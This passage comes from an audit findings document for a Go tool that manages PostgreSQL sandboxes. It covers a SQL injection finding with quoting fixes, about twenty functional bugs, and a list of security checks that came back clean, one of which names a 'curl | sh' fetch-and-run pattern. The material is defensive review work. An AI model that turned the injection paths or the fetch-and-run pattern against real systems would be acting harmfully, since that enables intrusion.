3. `destroy`/`status` interpolate `Physical.SlotName` /
   `Logical.SubscriptionName` from the config file into SQL literals;
   `NormalizeString` (see MED-2) doesn't strip quotes, and hand-edited
   configs bypass it entirely.

Impact is bounded — this is a local tool, trust auth, the injector is
usually the user themselves — but wrapper scripts passing untrusted values
(table names from a ticket, generated configs) turn these into real
superuser SQL injection.

**Suggested fix.**
- Add small helpers: `quoteIdent(s)` (double-quote, double embedded `"`)
  and `quoteLiteral(s)` (single-quote, double embedded `'`, and double
  `\` if standard_conforming_strings could be off).
- Tables list: parse each item as `(schema.)?name` (each part optionally
  already double-quoted), re-emit via `quoteIdent`; reject anything
  containing `;` or that fails the parse, with a clear error.
- Conninfo: escape per libpq single-quoted-value rules when embedding, or
  build `CONNECTION` via a psql variable (`-v conn=...` + `:'conn'`) which
  psql quotes safely.
- Slot/subscription names at use time: `quoteLiteral` them (destroy.go,
  status.go) regardless of what deploy-time normalization did.

**Tests.** Table list with `;` rejected; quoted identifiers round-trip;
conninfo with `'` produces valid SQL (assert the exact statement the fake
runner receives); slot name with `'` in config → escaped statement.

---

### MED-12: global_status attaches members to the wrong cluster after sort

```yaml
id: MED-12
status: not-fixed
fixed-commit: null
fixed-date: null
severity: medium
type: bug (wrong output)
files:
  - internal/sandbox/global_status.go:202-204  # sort of gs.Clusters
  - internal/sandbox/global_status.go:229-230  # index lookup recorded pre-sort
  - internal/sandbox/global_status.go:282      # clusterByName[ce.Name] = len(gs.Clusters)
verification: agent-reported (evidence quotes matched; re-confirm before fixing)
related: [LOW-6]
```

**Problem.** `clusterByName` records each cluster's index as it is
appended during the walk; `gs.Clusters` is then sorted; orphan
reconciliation afterwards does `idx := clusterByName[sb.Cluster];
gs.Clusters[idx].Members = append(...)` — indexing the *sorted* slice
with *pre-sort* positions. Whenever manifest names sort differently from
directory walk order, a relocated/orphan sandbox is appended to the wrong
cluster's member list in the output.

**Suggested fix.** Rebuild `clusterByName` after sorting (or perform the
sort as the final step, after reconciliation; or store `*ClusterEntry`
pointers instead of indices).

**Tests.** Two clusters whose walk order differs from sorted order + one
orphan sandbox naming the second → orphan appears under the correct
cluster.

---

## Low severity

### LOW-1: Standby application_name never actually configured

```yaml
id: LOW-1
status: not-fixed
severity: low
type: bug
files: [internal/sandbox/deploy_standby.go:149-158, internal/sandbox/deploy_standby.go:207-208]
verification: agent-reported
fixed-commit: null
```
`pg_basebackup -R` writes `primary_conninfo` from only `-h/-p/-U`; nothing
sets `application_name`, yet the config records `AppName: cfg.Name` as if
in effect. All standbys show `app=walreceiver` in `pg_stat_replication`,
indistinguishable from each other, contradicting the stored config.
**Fix:** set `PGAPPNAME=<cfg.Name>` in the pg_basebackup call's env (or
pass `-d` conninfo including `application_name=`). Test: fake runner sees
the env/conninfo; config `AppName` now truthful.

### LOW-2: Destroying a stopped subscriber silently leaks the publisher slot

```yaml
id: LOW-2
status: not-fixed
severity: low
type: bug (resource leak, silent)
files: [internal/sandbox/destroy.go:60-62]
verification: agent-reported
fixed-commit: null
```
DROP SUBSCRIPTION cleanup is gated on `isRunning(cfg)` with no message in
the skip path: `stop` then `destroy` a subscriber → publisher keeps an
active WAL-retaining slot with zero indication. **Fix:** at minimum WARN
with the publisher+slot name when skipping; better, best-effort drop the
slot directly on the publisher (the subscription's slot name is known).
Related: MED-10.

### LOW-3: Subscribing a sandbox to itself hangs forever

```yaml
id: LOW-3
status: not-fixed
severity: low
type: bug (hang)
files: [internal/sandbox/subscribe.go:121-124, internal/sandbox/subscribe.go:185-192]
verification: agent-reported
fixed-commit: null
```
`subscribe -s A --from A` resolves fine and `CREATE SUBSCRIPTION` back to
the same cluster with implicit `create_slot=true` hangs (documented
PostgreSQL behavior), with no timeout. **Fix:** after resolving, error if
publisher dir == subscriber dir (compare cleaned/symlink-resolved paths,
or host:port equality). Test: self-subscribe → immediate usage error.

### LOW-4: pg_hba replication line hardcodes 127.0.0.1/32

```yaml
id: LOW-4
status: not-fixed
severity: low
type: bug
files: [internal/sandbox/deploy_standby.go:64, internal/sandbox/deploy_standby.go:155]
verification: agent-reported
fixed-commit: null
```
The appended line is `host replication replicator 127.0.0.1/32 trust`, but
pg_basebackup connects to `srcCfg.Host` — any non-loopback source host
fails with no matching hba entry → ExitBasebackupFailed. **Fix:** derive
the CIDR from `srcCfg.Host` (`<host>/32` for IPv4, `/128` for IPv6, keep
loopback default otherwise), or use `samehost`. Test: source host
192.168.x.x → generated hba line matches.

### LOW-5: isPortListening swallows errors → false "running"

```yaml
id: LOW-5
status: not-fixed
severity: low
type: bug
files: [internal/sandbox/lifecycle.go:140-146]
verification: confirmed-in-source
fixed-commit: null
```
`busy, _ := portalloc.IsBusy(cfg.Host, cfg.Port)` — portalloc returns
`(true, err)` for *any* bind failure, so an unbindable/bogus host
(EADDRNOTAVAIL, DNS failure) reads as "listening" and `status` reports a
stopped instance as running. **Fix:** on error, return false (or plumb an
"unknown" state up to Status). Related: HIGH-1, LOW-7.

### LOW-6: Symlinked sandbox dirs invisible to global_status

```yaml
id: LOW-6
status: not-fixed
severity: low
type: bug
files: [internal/sandbox/global_status.go:260-261]
verification: agent-reported
fixed-commit: null
```
`if !e.IsDir() { continue }` — `os.ReadDir` DirEntry.IsDir() is false for
symlinks, so `pg17 -> /mnt/big/pg17` silently vanishes from the listing.
**Fix:** for non-dir entries, `os.Stat` the joined path and treat
dir-after-follow as a dir. Test: symlinked sandbox appears in output.

### LOW-7: cluster status folds probe failures into Missing

```yaml
id: LOW-7
status: not-fixed
severity: low
type: bug
files: [internal/cluster/status.go:113-121, internal/cluster/status.go:157-159]
verification: agent-reported
fixed-commit: null
```
A member dir that exists but whose status probe fails (corrupt config etc.)
sets `entry.Missing = true` — contradicting the struct's own doc and making
the renderer's `state=unknown` branch unreachable. The user is told the
member is *gone* when it may be running. **Fix:** add/populate a distinct
probe-failed state; only set Missing when the dir truly isn't a sandbox.

### LOW-8: loadJSONStrict accepts trailing garbage

```yaml
id: LOW-8
status: not-fixed
severity: low
type: bug
files: [internal/config/load_save.go:158-170]
verification: agent-reported
fixed-commit: null
```
Only the first JSON value is decoded; a botched hand edit leaving a second
`{...}` or stray `}` is silently ignored. **Fix:** after `Decode`, error if
`dec.More()` (allowing only trailing whitespace via a second Decode
returning io.EOF check). Test: trailing `{}` → load error naming the file.

### LOW-9: Atomic save never fsyncs the directory after rename

```yaml
id: LOW-9
status: not-fixed
severity: low
type: bug (durability)
files: [internal/config/load_save.go:200-218]
verification: agent-reported
fixed-commit: null
```
Temp file is fsynced but the rename's directory entry is not — power loss
shortly after a successful save can revert to the old config or (first
save) lose pg_sandbox.json entirely. **Fix:** `os.Open(filepath.Dir(target))`
→ `.Sync()` → `.Close()` after the rename; ignore/log platforms where dir
Sync errors (some filesystems).

### LOW-10: No cross-process lock on config load-modify-save

```yaml
id: LOW-10
status: not-fixed
severity: low
type: bug (lost update)
files: [internal/config/load_save.go:121-135, cmd/pg_sandbox/config.go:486-515]
verification: agent-reported
fixed-commit: null
```
Two parallel `config set` invocations both load, both save; the second
rename silently discards the first's key. **Fix:** `flock` (syscall.Flock,
LOCK_EX) on a `.pg_sandbox.lock` sibling around load-modify-save in the
mutating config paths. Keep read paths lock-free.

### LOW-11: `config set --global` accepts relative paths

```yaml
id: LOW-11
status: not-fixed
severity: low
type: bug (inconsistency)
files: [cmd/pg_sandbox/config.go:628-633, internal/config/validate.go (no Global validation), cmd/pg_sandbox/resolve.go:213]
verification: agent-reported
fixed-commit: null
```
Sandbox-scope path keys enforce absolute paths; global-scope
`sandboxRoot`/`defaultBinDir`/`pgGatherDir` don't, and get `filepath.Abs`'d
against whatever CWD the *next* command runs from — the same value works
from one directory and fails from another. **Fix:** in `config set
--global`, ExpandTilde then require `filepath.IsAbs` for path keys (or Abs
against CWD *at set time*, which at least freezes the meaning).

### LOW-12: Migrate bakes empty Logical.TargetDatabase before defaults

```yaml
id: LOW-12
status: not-fixed
severity: low
type: bug
files: [internal/config/migrate.go:114-125, cmd/pg_sandbox/config.go:793-795]
verification: agent-reported
fixed-commit: null
related: [MED-4]
```
`TargetDatabase: orDefault(kv["PGS_SUBSCRIPTION_DBNAME"], s.DefaultDatabase)`
runs at parse time when `DefaultDatabase` may still be "" (no PGS_DBNAME in
the legacy file); the caller's later defaults overlay fixes
`DefaultDatabase` but not the already-baked Logical block → Validate
rejects a legitimate legacy subscriber file. **Fix:** apply the defaults
overlay before building the Logical block, or re-derive TargetDatabase
after the overlay when it is empty.

### LOW-13: reorderBoolFlags hoists a value token that matches a bool flag

```yaml
id: LOW-13
status: not-fixed
severity: low
type: bug (flag parsing)
files: [cmd/pg_sandbox/argv.go:92-107]
verification: agent-reported
fixed-commit: null
```
`pg_sandbox build --configure-opts --with-icu 18.4`: the reorderer promotes
`--with-icu` (a known bool flag *token*, but here the value of
`--configure-opts`), so withICU=true, configureOpts becomes "18.4", and the
positional version vanishes → spurious "version is required" plus silently
lost configure opts. **Fix:** track value-taking flags during the scan and
skip the token immediately following one. Test: the exact argv above parses
as configureOpts="--with-icu", version="18.4".

### LOW-14: `--color` greedily swallows the subcommand as its value

```yaml
id: LOW-14
status: not-fixed
severity: low
type: bug (flag parsing / diagnostics)
files: [cmd/pg_sandbox/globals.go:212-222]
verification: agent-reported
fixed-commit: null
```
`pg_sandbox --color status -s x` captures "status" as the color value and
then reports `unknown command "-s"`. **Fix:** validate the captured value
∈ {auto, always, never}; if not, treat as missing value → clear error
("--color requires auto|always|never"), leaving the token in place.

### LOW-15: deploy/cluster build the runner from un-tilde-expanded bin-dir

```yaml
id: LOW-15
status: not-fixed
severity: low
type: bug (inconsistency)
files: [cmd/pg_sandbox/deploy.go:183, cmd/pg_sandbox/cluster.go:218, internal/sandbox/deploy.go:355]
verification: agent-reported
fixed-commit: null
```
`PGS_BIN_DIR='~/pg/17.4/bin' pg_sandbox deploy ...` fails
("bin-dir does not exist: ~/...") because the runner is built from the raw
value, even though the sandbox layer expands it for the persisted config
and build/report/cleanup expand it on their paths. **Fix:**
`fsutil.ExpandTilde` in the cmd layer before `pgexec.New` at both sites
(consistent with commit 5565726's intent).

### LOW-16: build shows no terminal progress despite tee comment

```yaml
id: LOW-16
status: not-fixed
severity: low
type: bug (doc/behavior mismatch, UX)
files: [internal/build/build.go:445-460]
verification: agent-reported
fixed-commit: null
```
`runStep`'s comment promises an `io.MultiWriter` tee of child output to the
caller's stderr; the code sends both streams only to the log file. Long
configure/make runs look hung; failures are only visible in the log file.
**Fix:** implement the tee as documented (or drop the comment and emit
periodic "still running step X" lines — implementing the tee is truer to
the doc).

### LOW-17: cluster deploy never prints conn strings to stdout

```yaml
id: LOW-17
status: not-fixed
severity: low
type: bug (contract violation)
files: [cmd/pg_sandbox/cluster.go:18-19, cmd/pg_sandbox/cluster.go:100, internal/cluster/deploy.go]
verification: agent-reported
fixed-commit: null
```
The file header promises "the conn-string list after deploy … go to
stdout", but `runClusterDeploy` discards its stdout writer (`_ io.Writer`)
and internal/cluster emits only INFO lines to stderr — under `--quiet` a
successful deploy prints nothing at all, and scripts can't capture
connection info the way single `deploy` allows. **Fix:** after a
successful deploy, print one conn string per member to stdout (mirror
single-deploy's format).

### LOW-18: `report --debug` discards the logger (no `# exec:` lines)

```yaml
id: LOW-18
status: not-fixed
severity: low
type: bug (debuggability)
files: [cmd/pg_sandbox/report.go:71, internal/report/report.go:234]
verification: agent-reported
fixed-commit: null
```
`if _, _, gErr := globals.Resolve(stderr); gErr != nil` throws away the
resolved logger, and `report.Generate` builds `pgexec.New(opts.BinDir)`
without one — so `--debug` produces none of the per-child `# exec:` lines
every other spawning command emits. **Fix:** keep the logger, pass it into
Generate (add a field on Options), attach via `.WithLogger`.

### LOW-19: Failed report deploys accumulate unnamed `_report_*` dirs

```yaml
id: LOW-19
status: not-fixed
severity: low
type: bug (cleanup / diagnostics)
files: [internal/report/report.go:236-246, internal/sandbox/deploy.go:235-262]
verification: agent-reported
fixed-commit: null
related: [MED-8]
```
The deploy-failure branch assumes "nothing to leave behind", but
`deployStandalone` creates the sandbox dir before initdb/pg_ctl and doesn't
remove it on failure — repeated failures pile up `_report_<tag>` dirs under
the sandbox root, polluting global_status, and the error never names them.
**Fix:** on deploy failure, remove the partial dir if it lacks
`pg_sandbox.json` (safe: it never became a sandbox); otherwise name it in
the error like the `leftover` wrapper does for later stages.

### LOW-20: cleanup sandbox walk depth-bounded at 4, silently excluding

```yaml
id: LOW-20
status: not-fixed
severity: low
type: bug (silent truncation feeding a destructive op)
files: [internal/cleanup/cleanup.go:203, internal/cleanup/cleanup.go:213-215]
verification: agent-reported
fixed-commit: null
related: [MED-5]
```
Sandboxes nested deeper than 4 levels under the sandbox root never register
their binDir in the in-use set — their install version shows "unused" and
gets deleted. **Fix:** when the bound stops descent into a directory that
still has subdirectories, log a WARN naming the skipped path (silent
truncation feeding a destructive operation is the real bug); optionally
raise the bound or make it configurable.

---

## Explicitly checked, no findings

For future reviewers — these were looked for and are clean as of `2b53512`:

- **Command injection via exec:** all child processes are spawned with
  argv arrays through `internal/pgexec`; no shell is ever invoked. The
  build version is regex-validated (`^[0-9]+\.[0-9]+$`) before being
  joined into URLs/paths; `--configure-opts` is whitespace-split, never
  shell-parsed.
- **Secrets:** sandboxes use `--auth=trust`; no passwords exist anywhere
  in configs, args, or logs. `logExec` deliberately omits env from debug
  lines.
- **Config file permissions:** written 0600 via `os.CreateTemp` +
  atomic rename; rename replaces a symlinked target rather than following
  it.
- **Path traversal in destroy:** `sandbox.Destroy` only removes a dir
  validated to contain `pg_sandbox.json`; `DataDirName`/`LogName` are
  rejected if absolute. (`cluster destroy` manifest names are the
  exception — see MED-7.)
- **scripts/build.sh / Makefile:** variables quoted where it matters,
  `set -eu`/`set -e` coverage adequate, no `curl | sh`.
- **HTML injection in reports:** the Go code interpolates nothing into
  the HTML; the report is psql stdout from `gather_report.sql` verbatim.
